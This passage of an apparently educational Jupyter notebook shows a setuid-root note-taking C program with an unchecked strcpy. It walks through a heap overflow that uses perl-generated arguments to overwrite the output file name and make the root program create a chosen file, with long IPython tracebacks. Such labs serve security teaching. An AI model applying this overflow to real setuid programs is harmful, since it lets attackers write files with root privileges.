      "   buffer = (char *) ec_malloc(100);\r\n",
      "   datafile = (char *) ec_malloc(20);\r\n",
      "   strcpy(datafile, \"/var/notes\");\r\n",
      "\r\n",
      "   if(argc < 2)                // If there aren't commandline arguments\r\n",
      "      usage(argv[0], datafile); // display usage message and exit\r\n",
      "\r\n",
      "   strcpy(buffer, argv[1]);  // copy into buffer\r\n",
      "\r\n",
      "   printf(\"[DEBUG] buffer   @ %p: \\'%s\\'\\n\", buffer, buffer);\r\n",
      "   printf(\"[DEBUG] datafile @ %p: \\'%s\\'\\n\", datafile, datafile);\r\n",
      "\r\n",
      " // Opening the file\r\n",
      "   fd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);\r\n",
      "   if(fd == -1)\r\n",
      "      fatal(\"in main() while opening file\");\r\n",
      "   printf(\"[DEBUG] file descriptor is %d\\n\", fd);\r\n",
      "\r\n",
      "   userid = getuid(); // get the real user ID\r\n",
      "\r\n",
      "// Writing data\r\n",
      "   if(write(fd, &userid, 4) == -1) // write user ID before note data\r\n",
      "      fatal(\"in main() while writing userid to file\");\r\n",
      "   write(fd, \"\\n\", 1); // terminate line\r\n",
      "\r\n",
      "   if(write(fd, buffer, strlen(buffer)) == -1) // write note\r\n",
      "      fatal(\"in main() while writing buffer to file\");\r\n",
      "   write(fd, \"\\n\", 1); // terminate line\r\n",
      "\r\n",
      "// Closing file\r\n",
      "   if(close(fd) == -1)\r\n",
      "      fatal(\"in main() while closing file\");\r\n",
      "\r\n",
      "   printf(\"Note has been saved.\\n\");\r\n",
      "   free(buffer);\r\n",
      "   free(datafile);\r\n",
      "}\r\n"
     ]
    }
   ],
   "source": [
    "! cat booksrc/notetaker.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[01m\u001b[K./booksrc/notetaker.c:\u001b[m\u001b[K In function ‘\u001b[01m\u001b[Kmain\u001b[m\u001b[K’:\r\n",
      "\u001b[01m\u001b[K./booksrc/notetaker.c:38:13:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Kgetuid\u001b[m\u001b[K’ [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\r\n",
      "   38 |    userid = \u001b[01;35m\u001b[Kgetuid\u001b[m\u001b[K(); // get the real user ID\r\n",
      "      |             \u001b[01;35m\u001b[K^~~~~~\u001b[m\u001b[K\r\n",
      "\u001b[01m\u001b[K./booksrc/notetaker.c:41:7:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Kwrite\u001b[m\u001b[K’; did you mean ‘\u001b[01m\u001b[Kfwrite\u001b[m\u001b[K’? [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\r\n",
      "   41 |    if(\u001b[01;35m\u001b[Kwrite\u001b[m\u001b[K(fd, &userid, 4) == -1) // write user ID before note data\r\n",
      "      |       \u001b[01;35m\u001b[K^~~~~\u001b[m\u001b[K\r\n",
      "      |       \u001b[32m\u001b[Kfwrite\u001b[m\u001b[K\r\n",
      "\u001b[01m\u001b[K./booksrc/notetaker.c:50:7:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Kclose\u001b[m\u001b[K’; did you mean ‘\u001b[01m\u001b[Kpclose\u001b[m\u001b[K’? [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\r\n",
      "   50 |    if(\u001b[01;35m\u001b[Kclose\u001b[m\u001b[K(fd) == -1)\r\n",
      "      |       \u001b[01;35m\u001b[K^~~~~\u001b[m\u001b[K\r\n",
      "      |       \u001b[32m\u001b[Kpclose\u001b[m\u001b[K\r\n"
     ]
    }
   ],
   "source": [
    "# let's compile notetaker.c\n",
    "! ./compile.sh ./booksrc/notetaker.c notetaker.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### notetaker.exe must be setuid root program \n",
    "- all users in the system can take their own notes by writing to /var/notes file\n",
    "\n",
    "```bash\n",
    "$ sudo chown root:root notetaker.exe\n",
    "$ sudo chmod u+s notetaker.exe\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwsr-sr-x 1 root root 19248 Apr 29 13:14 ./notetaker.exe\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "ls -al ./notetaker.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[DEBUG] buffer   @ 0x804d1a0: 'new note for user'\n",
      "[DEBUG] datafile @ 0x804d210: '/var/notes'\n",
      "[DEBUG] file descriptor is 3\n",
      "Note has been saved.\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "./notetaker.exe \"new note for user\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## overflowing buffer by corrupting datafile\n",
    "- how far down is datafile from buffer (the offset)\n",
    "- see source code and try to guess\n",
    "- use gdb; subtract the address of buffer from the address of datafile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[DEBUG] buffer   @ 0x804d1a0: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n",
      "[DEBUG] datafile @ 0x804d210: ''\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[!!] Fatal Error in main() while opening file: No such file or directory\n"
     ]
    },
    {
     "ename": "CalledProcessError",
     "evalue": "Command 'b'./notetaker.exe $(perl -e \\'print \"A\"x112\\')\\n# make datafile empty!\\n'' returned non-zero exit status 255.",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mCalledProcessError\u001b[0m                        Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-84-300fde2e08a8>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mget_ipython\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrun_cell_magic\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'bash'\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m''\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'./notetaker.exe $(perl -e \\'print \"A\"x112\\')\\n# make datafile empty!\\n'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/interactiveshell.py\u001b[0m in \u001b[0;36mrun_cell_magic\u001b[0;34m(self, magic_name, line, cell)\u001b[0m\n\u001b[1;32m   2321\u001b[0m             \u001b[0mmagic_arg_s\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvar_expand\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstack_depth\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2322\u001b[0m             \u001b[0;32mwith\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbuiltin_trap\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 2323\u001b[0;31m                 \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mfn\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mmagic_arg_s\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   2324\u001b[0m             \u001b[0;32mreturn\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2325\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magics/script.py\u001b[0m in \u001b[0;36mnamed_script_magic\u001b[0;34m(line, cell)\u001b[0m\n\u001b[1;32m    140\u001b[0m             \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    141\u001b[0m                 \u001b[0mline\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mscript\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 142\u001b[0;31m             \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mshebang\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    143\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    144\u001b[0m         \u001b[0;31m# write a basic docstring:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m</home/user/miniconda3/lib/python3.7/site-packages/decorator.py:decorator-gen-109>\u001b[0m in \u001b[0;36mshebang\u001b[0;34m(self, line, cell)\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magic.py\u001b[0m in \u001b[0;36m<lambda>\u001b[0;34m(f, *a, **k)\u001b[0m\n\u001b[1;32m    185\u001b[0m     \u001b[0;31m# but it's overkill for just that one bit of state.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    186\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mmagic_deco\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0marg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 187\u001b[0;31m         \u001b[0mcall\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mlambda\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    188\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    189\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mcallable\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0marg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magics/script.py\u001b[0m in \u001b[0;36mshebang\u001b[0;34m(self, line, cell)\u001b[0m\n\u001b[1;32m    243\u001b[0m             \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstderr\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mflush\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    244\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0margs\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mraise_error\u001b[0m \u001b[0;32mand\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m!=\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 245\u001b[0;31m             \u001b[0;32mraise\u001b[0m \u001b[0mCalledProcessError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0moutput\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mout\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstderr\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0merr\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    246\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    247\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m_run_script\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mto_close\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mCalledProcessError\u001b[0m: Command 'b'./notetaker.exe $(perl -e \\'print \"A\"x112\\')\\n# make datafile empty!\\n'' returned non-zero exit status 255."
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "./notetaker.exe $(perl -e 'print \"A\"x112')\n",
    "# make datafile empty!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 88,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rw------- 1 root root 126 Apr 29 13:25 testfile\r\n"
     ]
    }
   ],
   "source": [
    "# let's make sure testfile doesn't exist in the current director\n",
    "! ls -al testfile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "double free or corruption (out)\n",
      "bash: line 2:  4315 Aborted                 ./notetaker.exe $(perl -e 'print \"A\"x112 . \"testfile\"')\n"
     ]
    },
    {
     "ename": "CalledProcessError",
     "evalue": "Command 'b'# let\\'s create testfile and write the data sent as an argument\\n./notetaker.exe $(perl -e \\'print \"A\"x112 . \"testfile\"\\')\\n'' returned non-zero exit status 134.",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mCalledProcessError\u001b[0m                        Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-85-4df401b52885>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mget_ipython\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrun_cell_magic\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'bash'\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m''\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'# let\\'s create testfile and write the data sent as an argument\\n./notetaker.exe $(perl -e \\'print \"A\"x112 . \"testfile\"\\')\\n'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/interactiveshell.py\u001b[0m in \u001b[0;36mrun_cell_magic\u001b[0;34m(self, magic_name, line, cell)\u001b[0m\n\u001b[1;32m   2321\u001b[0m             \u001b[0mmagic_arg_s\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvar_expand\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstack_depth\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2322\u001b[0m             \u001b[0;32mwith\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbuiltin_trap\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 2323\u001b[0;31m                 \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mfn\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mmagic_arg_s\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   2324\u001b[0m             \u001b[0;32mreturn\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2325\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magics/script.py\u001b[0m in \u001b[0;36mnamed_script_magic\u001b[0;34m(line, cell)\u001b[0m\n\u001b[1;32m    140\u001b[0m             \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    141\u001b[0m                 \u001b[0mline\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mscript\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 142\u001b[0;31m             \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mshebang\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    143\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    144\u001b[0m         \u001b[0;31m# write a basic docstring:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m</home/user/miniconda3/lib/python3.7/site-packages/decorator.py:decorator-gen-109>\u001b[0m in \u001b[0;36mshebang\u001b[0;34m(self, line, cell)\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magic.py\u001b[0m in \u001b[0;36m<lambda>\u001b[0;34m(f, *a, **k)\u001b[0m\n\u001b[1;32m    185\u001b[0m     \u001b[0;31m# but it's overkill for just that one bit of state.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    186\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mmagic_deco\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0marg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 187\u001b[0;31m         \u001b[0mcall\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mlambda\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    188\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    189\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mcallable\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0marg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magics/script.py\u001b[0m in \u001b[0;36mshebang\u001b[0;34m(self, line, cell)\u001b[0m\n\u001b[1;32m    243\u001b[0m             \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstderr\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mflush\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    244\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0margs\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mraise_error\u001b[0m \u001b[0;32mand\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m!=\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 245\u001b[0;31m             \u001b[0;32mraise\u001b[0m \u001b[0mCalledProcessError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0moutput\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mout\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstderr\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0merr\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    246\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    247\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m_run_script\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mto_close\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mCalledProcessError\u001b[0m: Command 'b'# let\\'s create testfile and write the data sent as an argument\\n./notetaker.exe $(perl -e \\'print \"A\"x112 . \"testfile\"\\')\\n'' returned non-zero exit status 134."
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "# let's create testfile and write the data sent as an argument\n",
    "./notetaker.exe $(perl -e 'print \"A\"x112 . \"testfile\"')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rw------- 1 root root 126 Apr 29 13:25 testfile\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "ls -al testfile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "cat: testfile: Permission denied\n"
     ]
    },
    {
     "ename": "CalledProcessError",
     "evalue": "Command 'b'cat testfile\\n'' returned non-zero exit status 1.",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mCalledProcessError\u001b[0m                        Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-87-f6b2927fcb5a>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mget_ipython\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrun_cell_magic\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'bash'\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m''\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'cat testfile\\n'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/interactiveshell.py\u001b[0m in \u001b[0;36mrun_cell_magic\u001b[0;34m(self, magic_name, line, cell)\u001b[0m\n\u001b[1;32m   2321\u001b[0m             \u001b[0mmagic_arg_s\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvar_expand\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstack_depth\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2322\u001b[0m             \u001b[0;32mwith\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbuiltin_trap\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 2323\u001b[0;31m                 \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mfn\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mmagic_arg_s\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   2324\u001b[0m             \u001b[0;32mreturn\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2325\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magics/script.py\u001b[0m in \u001b[0;36mnamed_script_magic\u001b[0;34m(line, cell)\u001b[0m\n\u001b[1;32m    140\u001b[0m             \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    141\u001b[0m                 \u001b[0mline\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mscript\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 142\u001b[0;31m             \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mshebang\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    143\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    144\u001b[0m         \u001b[0;31m# write a basic docstring:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m</home/user/miniconda3/lib/python3.7/site-packages/decorator.py:decorator-gen-109>\u001b[0m in \u001b[0;36mshebang\u001b[0;34m(self, line, cell)\u001b[0m\n",
